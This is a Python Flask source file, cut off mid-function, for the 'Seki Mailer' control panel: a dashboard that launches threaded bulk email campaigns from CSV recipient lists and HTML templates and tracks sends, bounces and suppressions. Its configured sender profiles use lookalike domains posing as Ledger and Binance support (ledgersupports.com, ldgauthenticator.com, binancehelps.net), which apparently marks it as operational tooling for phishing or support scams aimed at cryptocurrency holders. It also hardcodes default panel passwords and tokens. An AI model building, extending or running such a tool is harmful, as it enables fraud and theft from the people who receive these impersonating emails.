#!/usr/bin/env python3
"""
Seki Mailer Control Panel
━━━━━━━━━━━━━━━━━━━━━━━━
Dark-theme web dashboard for managing Seki Mailer campaigns.
Runs on port 5001 (Sentinel panel is on 5000).

Features:
  • Launch campaigns (pick profile, CSV, template, subject)
  • Live campaign log tail
  • View send stats from seki_sends.db
  • Browse + preview templates
  • Manage suppression list
  • Process bounces
  • Dry-run mode toggle

Deploy:
  cp seki_panel.py /opt/seki/seki_panel.py
  # Create systemd service (instructions at bottom of file)
"""

import os, json, sqlite3, subprocess, threading, csv, io
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, session, redirect, Response

# ── Config ────────────────────────────────────────────────────────────────────
SEKI_DIR     = Path("/opt/seki")
SEKI_SCRIPT  = SEKI_DIR / "postfix_mailer.py"
SEKI_DB      = SEKI_DIR / "seki_sends.db"
SEKI_LOG     = SEKI_DIR / "seki_mailer.log"
SUPPRESS_FILE= SEKI_DIR / "suppressed.txt"
TEMPLATES_DIR= SEKI_DIR / "templates"
CAMPAIGNS_DIR= SEKI_DIR / "campaigns"
VENV_PYTHON  = Path("/opt/sentinel/venv/bin/python3")
PYTHON       = str(VENV_PYTHON) if VENV_PYTHON.exists() else "python3"
PANEL_PASSWORD = os.environ.get("SEKI_PANEL_PASSWORD", "seki2026")

# Seki profiles (must match .env prefix names)
PROFILES = {
    "SEKI":    {"label": "Support Calls Online",  "domain": "supportcallsonline.com"},
    "LEDGER":  {"label": "Ledger Supports",        "domain": "ledgersupports.com"},
    "LDGAUTH": {"label": "Ledger Authenticator",   "domain": "ldgauthenticator.com"},
    "BINANCE": {"label": "Binance Helps",          "domain": "binancehelps.net"},
}

app = Flask(__name__)
app.secret_key = os.environ.get("SEKI_SECRET", "seki-panel-secret-2026")

# Active process tracking
_running = {}  # campaign_id -> subprocess.Popen
_lock = threading.Lock()

# ── Helpers ───────────────────────────────────────────────────────────────────
def logged_in():
    return session.get("auth") == "ok"

def get_db():
    if not SEKI_DB.exists():
        return None
    conn = sqlite3.connect(SEKI_DB)
    conn.row_factory = sqlite3.Row
    return conn

def list_templates():
    if not TEMPLATES_DIR.exists():
        return []
    return sorted([f.name for f in TEMPLATES_DIR.glob("*.html")])

def list_csvs():
    if not CAMPAIGNS_DIR.exists():
        return []
    return sorted([f.name for f in CAMPAIGNS_DIR.glob("*.csv")])

def get_stats():
    conn = get_db()
    if not conn:
        return {"total": 0, "sent": 0, "failed": 0, "today": 0, "campaigns": []}
    try:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM sends")
        total = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM sends WHERE status='sent'")
        sent = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM sends WHERE status!='sent'")
        failed = cur.fetchone()[0]
        today = datetime.now().strftime("%Y-%m-%d")
        cur.execute("SELECT COUNT(*) FROM sends WHERE sent_at LIKE ?", (f"{today}%",))
        today_count = cur.fetchone()[0]
        cur.execute("""
            SELECT campaign_id, COUNT(*) as total,
                   SUM(CASE WHEN status='sent' THEN 1 ELSE 0 END) as sent,
                   MAX(sent_at) as last_send
            FROM sends GROUP BY campaign_id ORDER BY last_send DESC LIMIT 10
        """)
        campaigns = [dict(r) for r in cur.fetchall()]
        conn.close()
        return {"total": total, "sent": sent, "failed": failed,
                "today": today_count, "campaigns": campaigns}
    except Exception as e:
        return {"total": 0, "sent": 0, "failed": 0, "today": 0,
                "campaigns": [], "error": str(e)}

def get_suppressed():
    if not SUPPRESS_FILE.exists():
        return []
    lines = SUPPRESS_FILE.read_text().strip().splitlines()
    return [l.strip() for l in lines if l.strip()]

# ── Auth ──────────────────────────────────────────────────────────────────────
@app.route("/login", methods=["GET", "POST"])
def login():
    error = ""
    if request.method == "POST":
        if request.form.get("password") == PANEL_PASSWORD:
            session["auth"] = "ok"
            return redirect("/")
        error = "Wrong password"
    return f"""<!DOCTYPE html><html><head>
<title>Seki Panel — Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap');
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{background:#030507;color:#e2e8f0;font-family:'Syne',sans-serif;
        display:flex;align-items:center;justify-content:center;min-height:100vh}}
  .card{{background:#0a0d12;border:1px solid #1a2030;border-radius:16px;
         padding:48px 40px;width:100%;max-width:360px;text-align:center}}
  .logo{{font-size:28px;font-weight:800;letter-spacing:-1px;margin-bottom:6px;
         background:linear-gradient(135deg,#38bdf8,#818cf8);
         -webkit-background-clip:text;-webkit-text-fill-color:transparent}}
  .sub{{font-size:12px;color:#475569;margin-bottom:32px;font-family:'JetBrains Mono',monospace}}
  input{{width:100%;padding:12px 16px;background:#060910;border:1px solid #1e293b;
         border-radius:8px;color:#e2e8f0;font-family:'JetBrains Mono',monospace;
         font-size:14px;margin-bottom:16px;outline:none}}
  input:focus{{border-color:#38bdf8}}
  button{{width:100%;padding:13px;background:linear-gradient(135deg,#0ea5e9,#6366f1);
          border:none;border-radius:8px;color:#fff;font-weight:700;font-size:14px;
          cursor:pointer;font-family:'Syne',sans-serif;letter-spacing:.5px}}
  .err{{color:#f87171;font-size:13px;margin-bottom:12px}}
</style></head><body>
<div class="card">
  <div class="logo">⚡ SEKI</div>
  <div class="sub">MAILER CONTROL PANEL v2.3</div>
  {'<div class="err">'+error+'</div>' if error else ''}
  <form method="POST">
    <input type="password" name="password" placeholder="Password" autofocus>
    <button type="submit">Access Panel</button>
  </form>
</div></body></html>"""

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")

# ── API ───────────────────────────────────────────────────────────────────────
@app.route("/api/stats")
def api_stats():
    if not logged_in(): return jsonify({"ok": False}), 401
    stats = get_stats()
    stats["running"] = list(_running.keys())
    stats["templates"] = list_templates()
    stats["csvs"] = list_csvs()
    stats["suppressed_count"] = len(get_suppressed())
    stats["profiles"] = {k: v["label"] for k, v in PROFILES.items()}
    return jsonify({"ok": True, **stats})

@app.route("/api/launch", methods=["POST"])
def api_launch():
    if not logged_in(): return jsonify({"ok": False}), 401
    data = request.get_json(force=True) or {}
    profile  = data.get("profile", "SEKI")
    csv_file = data.get("csv", "").strip()
    template = data.get("template", "").strip()
    subject  = data.get("subject", "").strip()
    workers  = int(data.get("workers", 3))
    rate     = float(data.get("rate", 0.2))
    dry_run  = data.get("dry_run", False)
    campaign = data.get("campaign") or f"seki_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    if not csv_file:
        return jsonify({"ok": False, "output": "CSV file required."})
    if not template:
        return jsonify({"ok": False, "output": "Template required."})
    if not subject:
        return jsonify({"ok": False, "output": "Subject required."})

    csv_path = CAMPAIGNS_DIR / csv_file
    tpl_path = TEMPLATES_DIR / template

    if not csv_path.exists():
        return jsonify({"ok": False, "output": f"CSV not found: {csv_file}"})
    if not tpl_path.exists():
        return jsonify({"ok": False, "output": f"Template not found: {template}"})

    cmd = [
        PYTHON, str(SEKI_SCRIPT),
        "--csv",      str(csv_path),
        "--html",     str(tpl_path),
        "--subject",  subject,
        "--profile",  profile,
        "--workers",  str(workers),
        "--rate",     str(rate),
        "--campaign", campaign,
        "--db",       str(SEKI_DB),
        "--suppress", str(SUPPRESS_FILE),
        "--sentinel-url",   "http://localhost:5055",
        "--sentinel-token", os.environ.get("SENTINEL_SEKI_TOKEN", "seki-sentinel-token-2026"),
    ]
    if dry_run:
        cmd.append("--dry-run")

    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"

    proc = subprocess.Popen(
        cmd, cwd=str(SEKI_DIR),
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, env=env
    )
    with _lock:
        _running[campaign] = proc

    def cleanup():
        proc.wait()
        with _lock:
            _running.pop(campaign, None)
    threading.Thread(target=cleanup, daemon=True).start()

    return jsonify({"ok": True, "output": f"Campaign '{campaign}' launched.", "campaign": campaign})

@app.route("/api/log")
def api_log():
    """Return last N lines of seki_mailer.log."""
    if not logged_in(): return jsonify({"ok": False}), 401
    n = int(request.args.get("n", 80))
    if not SEKI_LOG.exists():
        return jsonify({"ok": True, "lines": []})
    lines = SEKI_LOG.read_text(encoding="utf-8", errors="replace").splitlines()
    return jsonify({"ok": True, "lines": lines[-n:]})

@app.route("/api/stop", methods=["POST"])
def api_stop():
    if not logged_in(): return jsonify({"ok": False}), 401
    data = request.get_json(force=True) or {}
    campaign = data.get("campaign", "")
    with _lock:
        proc = _running.get(campaign)
    if proc:
        proc.terminate()
        return jsonify({"ok": True, "output": f"Stopped {campaign}"})
    return jsonify({"ok": False, "output": "Campaign not running."})

@app.route("/api/suppressed")
def api_suppressed():
    if not logged_in(): return jsonify({"ok": False}), 401
    emails = get_suppressed()
    q = request.args.get("q", "").lower()
    if q:
        emails = [e for e in emails if q in e]
    return jsonify({"ok": True, "emails": emails, "total": len(emails)})

@app.route("/api/suppressed/remove", methods=["POST"])
def api_suppressed_remove():
    if not logged_in(): return jsonify({"ok": False}), 401
    data = request.get_json(force=True) or {}
    email = data.get("email", "").strip().lower()
    if not email:
        return jsonify({"ok": False, "output": "No email provided."})
    emails = get_suppressed()
    if email not in emails:
        return jsonify({"ok": False, "output": f"{email} not in suppression list."})
    emails = [e for e in emails if e != email]
    SUPPRESS_FILE.write_text("\n".join(emails) + "\n")
    return jsonify({"ok": True, "output": f"Removed {email} from suppression."})

@app.route("/api/suppressed/add", methods=["POST"])
def api_suppressed_add():
    if not logged_in(): return jsonify({"ok": False}), 401
    data = request.get_json(force=True) or {}
    email = data.get("email", "").strip().lower()
    if not email or "@" not in email:
        return jsonify({"ok": False, "output": "Invalid email."})
    emails = get_suppressed()
    if email in emails:
        return jsonify({"ok": False, "output": f"{email} already suppressed."})
    with open(SUPPRESS_FILE, "a") as f:
        f.write(email + "\n")
    return jsonify({"ok": True, "output": f"Added {email} to suppression."})

@app.route("/api/bounces/process", methods=["POST"])
def api_process_bounces():
    if not logged_in(): return jsonify({"ok": False}), 401
    data = request.get_json(force=True) or {}
    profile = data.get("profile", "SEKI")
    try:
        result = subprocess.run(
            [PYTHON, str(SEKI_SCRIPT), "--process-bounces", "--profile", profile,
             "--db", str(SEKI_DB), "--suppress", str(SUPPRESS_FILE)],
            cwd=str(SEKI_DIR), capture_output=True, text=True, timeout=60,
            env={**os.environ, "PYTHONUNBUFFERED": "1"}
        )
        out = (result.stdout + result.stderr).strip()[-1500:]
        return jsonify({"ok": result.returncode == 0, "output": out or "Done."})
    except subprocess.TimeoutExpired:
        return jsonify({"ok": False, "output": "Timed out after 60s."})

@app.route("/api/preview")
def api_preview():
    if not logged_in(): return redirect("/login")
    name = request.args.get("name", "")
    path = TEMPLATES_DIR / name
    if not path.exists() or not name.endswith(".html"):
        return "Not found", 404
    return path.read_text(encoding="utf-8"), 200, {"Content-Type": "text/html"}

# ── Main dashboard ────────────────────────────────────────────────────────────
@app.route("/")
def index():
    if not logged_in():
        return redirect("/login")
    return DASHBOARD_HTML

# ── Dashboard HTML ────────────────────────────────────────────────────────────
DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Seki Mailer Panel</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#030507;--surface:#080c12;--card:#0c1118;--card2:#0f1520;
  --border:#1a2535;--border2:#22304a;
  --sky:#38bdf8;--indigo:#818cf8;--emerald:#34d399;--amber:#fbbf24;
  --red:#f87171;--muted:#4a5568;--dim:#2d3748;--text:#cbd5e1;--white:#f0f4f8;
  --font:'Syne',sans-serif;--mono:'JetBrains Mono',monospace;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh;display:flex}

/* ── Sidebar ── */
.sidebar{width:220px;min-height:100vh;background:var(--surface);border-right:1px solid var(--border);
  display:flex;flex-direction:column;padding:24px 0;flex-shrink:0;position:fixed;top:0;left:0;bottom:0}
.logo{padding:0 20px 24px;border-bottom:1px solid var(--border);margin-bottom:16px}
.logo-mark{font-size:22px;font-weight:800;letter-spacing:-1px;
  background:linear-gradient(135deg,var(--sky),var(--indigo));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;line-height:1}
.logo-sub{font-size:10px;color:var(--muted);font-family:var(--mono);margin-top:3px;letter-spacing:1px}
.nav{flex:1;padding:0 10px}
.nav-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:8px;
  cursor:pointer;font-size:13px;font-weight:600;color:var(--muted);margin-bottom:2px;
  transition:all .15s;border:1px solid transparent}
.nav-item:hover{color:var(--text);background:var(--card)}
.nav-item.active{color:var(--sky);background:rgba(56,189,248,.08);border-color:rgba(56,189,248,.15)}
.nav-icon{font-size:16px;width:20px;text-align:center}
.sidebar-bottom{padding:16px 20px;border-top:1px solid var(--border)}
.status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--emerald);
  margin-right:6px;box-shadow:0 0 6px var(--emerald)}
.status-label{font-size:11px;color:var(--muted);font-family:var(--mono)}

/* ── Main ── */
.main{margin-left:220px;flex:1;padding:32px;max-width:1200px}
.page{display:none}.page.active{display:block}
.page-title{font-size:22px;font-weight:800;color:var(--white);margin-bottom:6px;letter-spacing:-.5px}
.page-sub{font-size:13px;color:var(--muted);margin-bottom:28px}

/* ── Stats row ── */
.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:28px}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px 20px}
.stat-val{font-size:28px;font-weight:800;color:var(--white);font-family:var(--mono);line-height:1}
.stat-lbl{font-size:11px;color:var(--muted);margin-top:5px;text-transform:uppercase;letter-spacing:.5px}
.stat-card.sky .stat-val{color:var(--sky)}
.stat-card.emerald .stat-val{color:var(--emerald)}
.stat-card.amber .stat-val{color:var(--amber)}
.stat-card.red .stat-val{color:var(--red)}

/* ── Cards ── */
.card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:22px;margin-bottom:16px}
.card-title{font-size:13px;font-weight:700;color:var(--white);margin-bottom:16px;
  text-transform:uppercase;letter-spacing:.5px;display:flex;align-items:center;gap:8px}

/* ── Form ── */
label{display:block;font-size:11px;color:var(--muted);margin-bottom:5px;margin-top:14px;
  text-transform:uppercase;letter-spacing:.5px;font-weight:600}
label:first-child{margin-top:0}
input,select,textarea{width:100%;padding:10px 13px;background:#060910;border:1px solid var(--border);
  border-radius:8px;color:var(--text);font-family:var(--mono);font-size:13px;outline:none;
  transition:border .15s}
input:focus,select:focus,textarea:focus{border-color:var(--sky)}
select option{background:#060910}
textarea{resize:vertical;min-height:80px}
.form-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.form-row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}

/* ── Buttons ── */
.btn{display:inline-flex;align-items:center;gap:6px;padding:10px 18px;border-radius:8px;
  border:none;cursor:pointer;font-weight:700;font-size:13px;font-family:var(--font);
  transition:all .15s;letter-spacing:.3px}
.btn.primary{background:linear-gradient(135deg,#0ea5e9,#6366f1);color:#fff}
.btn.primary:hover{opacity:.88}
.btn.emerald{background:rgba(52,211,153,.12);color:var(--emerald);border:1px solid rgba(52,211,153,.25)}
.btn.emerald:hover{background:rgba(52,211,153,.2)}
.btn.red{background:rgba(248,113,113,.1);color:var(--red);border:1px solid rgba(248,113,113,.2)}
.btn.red:hover{background:rgba(248,113,113,.18)}
.btn.ghost{background:transparent;color:var(--muted);border:1px solid var(--border)}
.btn.ghost:hover{color:var(--text);border-color:var(--border2)}
.btn.sm{padding:7px 13px;font-size:12px}
.btn-row{display:flex;gap:10px;margin-top:18px;flex-wrap:wrap}

/* ── Log ── */
.log-box{background:#020507;border:1px solid var(--border);border-radius:8px;
  padding:14px;font-family:var(--mono);font-size:11.5px;color:#64748b;
  max-height:340px;overflow-y:auto;white-space:pre-wrap;line-height:1.7}
.log-box .ok{color:#34d399}.log-box .err{color:#f87171}.log-box .warn{color:#fbbf24}

/* ── Table ── */
.tbl{width:100%;border-collapse:collapse;font-size:12.5px}
.tbl th{text-align:left;padding:8px 12px;color:var(--muted);border-bottom:1px solid var(--border);
  font-size:11px;text-transform:uppercase;letter-spacing:.4px;font-weight:600}
.tbl td{padding:9px 12px;border-bottom:1px solid var(--dim);color:var(--text)}
.tbl tr:last-child td{border-bottom:none}
.tbl tr:hover td{background:rgba(255,255,255,.02)}

/* ── Badges ── */
.badge{display:inline-block;padding:2px 8px;border-radius:20px;font-size:11px;font-weight:600;font-family:var(--mono)}
.badge.green{background:rgba(52,211,153,.12);color:var(--emerald)}
.badge.red{background:rgba(248,113,113,.1);color:var(--red)}
.badge.sky{background:rgba(56,189,248,.1);color:var(--sky)}
.badge.amber{background:rgba(251,191,36,.1);color:var(--amber)}

/* ── SMTP Switcher ── */
.smtp-bar{background:var(--card2);border:1px solid var(--border);border-radius:10px;
  padding:14px 18px;display:flex;align-items:center;gap:14px;margin-bottom:20px;flex-wrap:wrap}
.smtp-label{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;font-weight:600}
.smtp-select{flex:1;min-width:200px;max-width:360px}

/* ── Preview ── */
.preview-frame{width:100%;height:500px;border:1px solid var(--border);border-radius:8px;background:#fff}

/* ── Running badge ── */
.running-pulse{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--emerald);
  margin-right:6px;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(52,211,153,.4)}
  50%{opacity:.7;box-shadow:0 0 0 5px transparent}}

/* ── Toast ── */
#toast{position:fixed;bottom:24px;right:24px;padding:12px 18px;border-radius:10px;
  font-size:13px;font-weight:600;z-index:9999;opacity:0;transition:opacity .3s;pointer-events:none;
  font-family:var(--font)}
#toast.show{opacity:1}
#toast.ok{background:#0f2818;color:var(--emerald);border:1px solid rgba(52,211,153,.3)}
#toast.fail{background:#1f0f0f;color:var(--red);border:1px solid rgba(248,113,113,.3)}

/* ── Output box ── */
.out-box{margin-top:12px;padding:10px 14px;background:#020507;border:1px solid var(--border);
  border-radius:8px;font-family:var(--mono);font-size:12px;color:var(--muted);
  min-height:36px;white-space:pre-wrap;display:none}
.out-box.show{display:block}

@media(max-width:768px){
  .sidebar{width:100%;min-height:auto;position:relative;flex-direction:row;flex-wrap:wrap;padding:12px}
  .main{margin-left:0;padding:16px}
  .stats-row{grid-template-columns:1fr 1fr}
  .form-row,.form-row3{grid-template-columns:1fr}
}
</style>
</head>
<body>

<!-- Sidebar -->
<nav class="sidebar">
  <div class="logo">
    <div class="logo-mark">⚡ SEKI</div>
    <div class="logo-sub">MAILER PANEL v2.3</div>
  </div>
  <div class="nav">
    <div class="nav-item active" data-page="dashboard" onclick="nav(this)">
      <span class="nav-icon">📊</span> Dashboard
    </div>
    <div class="nav-item" data-page="launch" onclick="nav(this)">
      <span class="nav-icon">🚀</span> Launch
    </div>
    <div class="nav-item" data-page="campaigns" onclick="nav(this)">
      <span class="nav-icon">📋</span> Campaigns
    </div>
    <div class="nav-item" data-page="templates" onclick="nav(this)">
      <span class="nav-icon">🎨</span> Templates
    </div>
    <div class="nav-item" data-page="suppression" onclick="nav(this)">
      <span class="nav-icon">🚫</span> Suppression
    </div>
    <div class="nav-item" data-page="logs" onclick="nav(this)">
      <span class="nav-icon">📟</span> Live Log
    </div>
    <div class="nav-item" data-page="bounces" onclick="nav(this)">
      <span class="nav-icon">↩️</span> Bounces
    </div>
  </div>
  <div class="sidebar-bottom">
    <span class="status-dot"></span>
    <span class="status-label" id="running-label">IDLE</span><br>
    <a href="/logout" style="font-size:11px;color:var(--muted);text-decoration:none;margin-top:8px;display:block">Sign out</a>
  </div>
</nav>

<!-- Main -->
<main class="main">

  <!-- DASHBOARD -->
  <div class="page active" id="page-dashboard">
    <div class="page-title">Dashboard</div>
    <div class="page-sub" id="dash-time">Loading...</div>
    <div class="stats-row">
      <div class="stat-card sky"><div class="stat-val" id="s-total">—</div><div class="stat-lbl">Total Sent</div></div>
      <div class="stat-card emerald"><div class="stat-val" id="s-sent">—</div><div class="stat-lbl">Delivered</div></div>
      <div class="stat-card amber"><div class="stat-val" id="s-today">—</div><div class="stat-lbl">Today</div></div>
      <div class="stat-card red"><div class="stat-val" id="s-failed">—</div><div class="stat-lbl">Failed</div></div>
    </div>
    <div class="card">
      <div class="card-title">📋 Recent Campaigns</div>
      <table class="tbl">
        <thead><tr>
          <th>Campaign ID</th><th>Total</th><th>Sent</th><th>Last Send</th><th>Status</th>
        </tr></thead>
        <tbody id="campaigns-body">
          <tr><td colspan="5" style="color:var(--muted);text-align:center;padding:20px">Loading...</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- LAUNCH -->
  <div class="page" id="page-launch">
    <div class="page-title">Launch Campaign</div>
    <div class="page-sub">Configure and fire a Seki Mailer send job</div>
    <div class="card">
      <div class="card-title">🎯 Campaign Setup</div>
      <div class="form-row">
        <div>
          <label>Profile (sender identity)</label>
          <select id="l-profile"></select>
        </div>
        <div>
          <label>CSV File (from /opt/seki/campaigns/)</label>
          <select id="l-csv"></select>
        </div>
      </div>
      <div class="form-row">
        <div>
          <label>HTML Template (from /opt/seki/templates/)</label>
          <select id="l-template"></select>
        </div>
        <div>
          <label>Subject Line</label>
          <input type="text" id="l-subject" placeholder="Your subject (supports {{first_name}})">
        </div>
      </div>
      <div class="form-row3">
        <div>
          <label>Workers (threads)</label>
          <input type="number" id="l-workers" value="3" min="1" max="20">
        </div>
        <div>
          <label>Rate (sec/thread delay)</label>
          <input type="number" id="l-rate" value="0.2" min="0.05" step="0.05">
        </div>
        <div>
          <label>Campaign ID (optional)</label>
          <input type="text" id="l-campaign" placeholder="Auto-generated if blank">
        </div>
      </div>
      <div style="margin-top:16px;display:flex;align-items:center;gap:10px">
        <input type="checkbox" id="l-dryrun" style="width:auto;margin:0">
        <label style="margin:0;cursor:pointer" for="l-dryrun">Dry Run (simulate — no emails sent)</label>
      </div>
      <div class="btn-row">
        <button class="btn primary" onclick="launchCampaign()">🚀 Launch Campaign</button>
        <button class="btn ghost sm" onclick="nav(document.querySelector('[data-page=logs]'))">View Live Log →</button>
      </div>
      <div class="out-box" id="launch-out"></div>
    </div>
  </div>

  <!-- CAMPAIGNS -->
  <div class="page" id="page-campaigns">
    <div class="page-title">Campaign History</div>
    <div class="page-sub">All campaigns from seki_sends.db</div>
    <div class="card">
      <div id="running-list" style="margin-bottom:14px;display:none">
        <div class="card-title"><span class="running-pulse"></span>Running Now</div>
        <div id="running-campaigns"></div>
      </div>
      <table class="tbl">
        <thead><tr>
          <th>Campaign ID</th><th>Total</th><th>Sent</th><th>Last Send</th>
        </tr></thead>
        <tbody id="camp-body">
          <tr><td colspan="4" style="color:var(--muted);text-align:center;padding:20px">Loading...</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- TEMPLATES -->
  <div class="page" id="page-templates">
    <div class="page-title">Templates</div>
    <div class="page-sub">HTML templates in /opt/seki/templates/</div>
    <div class="form-row" style="margin-bottom:16px">
      <div>
        <label>Select Template to Preview</label>
        <select id="tpl-select" onchange="loadPreview()"></select>
      </div>
    </div>
    <button class="btn ghost sm" onclick="window.open('/api/preview?name='+document.getElementById('tpl-select').value,'_blank')">Open in new tab ↗</button>
    <div style="margin-top:14px">
      <iframe class="preview-frame" id="preview-frame" src="about:blank"></iframe>
    </div>
  </div>

  <!-- SUPPRESSION -->
  <div class="page" id="page-suppression">
    <div class="page-title">Suppression List</div>
    <div class="page-sub" id="sup-count">Loading...</div>
    <div class="card">
      <div class="card-title">Add to Suppression</div>
      <div style="display:flex;gap:10px">
        <input type="email" id="sup-add-email" placeholder="email@example.com" style="flex:1">
        <button class="btn red sm" onclick="addSuppressed()">Add</button>
      </div>
    </div>
    <div class="card">
      <div class="card-title" style="justify-content:space-between">
        <span>Suppressed Emails</span>
        <input type="text" id="sup-search" placeholder="Search..." onkeyup="loadSuppressed()"
          style="width:180px;padding:6px 10px;font-size:12px">
      </div>
      <div id="sup-list" style="max-height:400px;overflow-y:auto">
        <p style="color:var(--muted);font-size:13px">Loading...</p>
      </div>
    </div>
  </div>

  <!-- LOGS -->
  <div class="page" id="page-logs">
    <div class="page-title">Live Log</div>
    <div class="page-sub">Last 80 lines of seki_mailer.log — auto-refreshes every 5s</div>
    <div style="display:flex;gap:10px;margin-bottom:14px">
      <button class="btn ghost sm" onclick="loadLog()">↺ Refresh</button>
      <button class="btn ghost sm" onclick="toggleAutoRefresh()" id="ar-btn">⏸ Pause</button>
    </div>
    <div class="log-box" id="log-box">Loading log...</div>
  </div>

  <!-- BOUNCES -->
  <div class="page" id="page-bounces">
    <div class="page-title">Bounce Processing</div>
    <div class="page-sub">Parse bounce mailbox and auto-suppress bounced addresses</div>
    <div class="card">
      <div class="card-title">Process Bounces</div>
      <label>Profile (determines which bounce mailbox to check)</label>
      <select id="bounce-profile"></select>
      <div class="btn-row">
        <button class="btn emerald" onclick="processBounces()">↩️ Process Bounces Now</button>
      </div>
      <div class="out-box" id="bounce-out"></div>
    </div>
  </div>

</main>

<div id="toast"></div>

<script>
// ── State ──────────────────────────────────────────────────────
let statsData = {};
let autoRefresh = true;
let logTimer = null;

// ── Nav ────────────────────────────────────────────────────────
function nav(el) {
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  el.classList.add('active');
  document.getElementById('page-' + el.dataset.page).classList.add('active');
  if (el.dataset.page === 'logs') { loadLog(); startLogRefresh(); }
  else stopLogRefresh();
  if (el.dataset.page === 'suppression') loadSuppressed();
  if (el.dataset.page === 'dashboard' || el.dataset.page === 'campaigns') loadStats();
}

// ── API helpers ────────────────────────────────────────────────
async function api(url) {
  const r = await fetch(url);
  return r.json();
}
async function post(url, body) {
  const r = await fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)});
  return r.json();
}

// ── Toast ──────────────────────────────────────────────────────
function toast(msg, ok=true) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'show ' + (ok ? 'ok' : 'fail');
  setTimeout(() => t.className = '', 3000);
}
function showOut(id, r) {
  const el = document.getElementById(id);
  el.textContent = r.output || '';
  el.className = 'out-box show';
}

// ── Stats ──────────────────────────────────────────────────────
async function loadStats() {
  const r = await api('/api/stats');
  if (!r.ok) return;
  statsData = r;

  // Stats cards
  document.getElementById('s-total').textContent = r.total ?? '—';
  document.getElementById('s-sent').textContent = r.sent ?? '—';
  document.getElementById('s-today').textContent = r.today ?? '—';
  document.getElementById('s-failed').textContent = r.failed ?? '—';
  document.getElementById('dash-time').textContent = 'Last updated: ' + new Date().toLocaleTimeString();

  // Running indicator
  const running = r.running || [];
  document.getElementById('running-label').textContent = running.length ? `${running.length} RUNNING` : 'IDLE';

  // Dashboard campaigns table
  const tbody = document.getElementById('campaigns-body');
  if (r.campaigns && r.campaigns.length) {
    tbody.innerHTML = r.campaigns.map(c => `
      <tr>
        <td style="font-family:var(--mono);font-size:11px">${c.campaign_id}</td>
        <td>${c.total}</td>
        <td><span class="badge green">${c.sent}</span></td>
        <td style="font-size:11px;color:var(--muted)">${(c.last_send||'').substring(0,16)}</td>
        <td>${running.includes(c.campaign_id)
          ? '<span class="badge sky"><span class="running-pulse" style="margin-right:4px"></span>Running</span>'
          : '<span class="badge green">Done</span>'}</td>
      </tr>`).join('');
  } else {
    tbody.innerHTML = '<tr><td colspan="5" style="color:var(--muted);text-align:center;padding:20px">No campaigns yet.</td></tr>';
  }

  // Camp page
  const campBody = document.getElementById('camp-body');
  if (campBody && r.campaigns) {
    campBody.innerHTML = r.campaigns.map(c => `
      <tr>
        <td style="font-family:var(--mono);font-size:11px">${c.campaign_id}</td>
        <td>${c.total}</td><td>${c.sent}</td>
        <td style="font-size:11px;color:var(--muted)">${(c.last_send||'').substring(0,16)}</td>
      </tr>`).join('') || '<tr><td colspan="4" style="color:var(--muted);text-align:center;padding:20px">No data.</td></tr>';
  }

  // Running campaigns stop buttons
  const runDiv = document.getElementById('running-list');
  const runCamp = document.getElementById('running-campaigns');
  if (running.length) {
    runDiv.style.display = 'block';
    runCamp.innerHTML = running.map(id => `
      <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px">
        <span class="running-pulse"></span>
        <span style="font-family:var(--mono);font-size:12px;color:var(--sky)">${id}</span>
        <button class="btn red sm" onclick="stopCampaign('${id}')">Stop</button>
      </div>`).join('');
  } else {
    runDiv.style.display = 'none';
  }

  // Populate selects
  populateSelects(r);
}

function populateSelects(r) {
  // Profiles
  ['l-profile','bounce-profile'].forEach(id => {
    const el = document.getElementById(id);
    if (!el || el.options.length) return;
    Object.entries(r.profiles || {}).forEach(([k,v]) => {
      const o = document.createElement('option');
      o.value = k; o.textContent = `${k} — ${v}`; el.appendChild(o);
    });
  });
  // CSVs
  const csv = document.getElementById('l-csv');
  if (csv && !csv.options.length) {
    (r.csvs||[]).forEach(f => { const o=document.createElement('option'); o.value=f; o.textContent=f; csv.appendChild(o); });
    if (!r.csvs?.length) { const o=document.createElement('option'); o.value=''; o.textContent='No CSVs found'; csv.appendChild(o); }
  }
  // Templates
  ['l-template','tpl-select'].forEach(id => {
    const el = document.getElementById(id);
    if (!el || el.options.length) return;
    (r.templates||[]).forEach(f => { const o=document.createElement('option'); o.value=f; o.textContent=f; el.appendChild(o); });
  });
}

// ── Launch ─────────────────────────────────────────────────────
async function launchCampaign() {
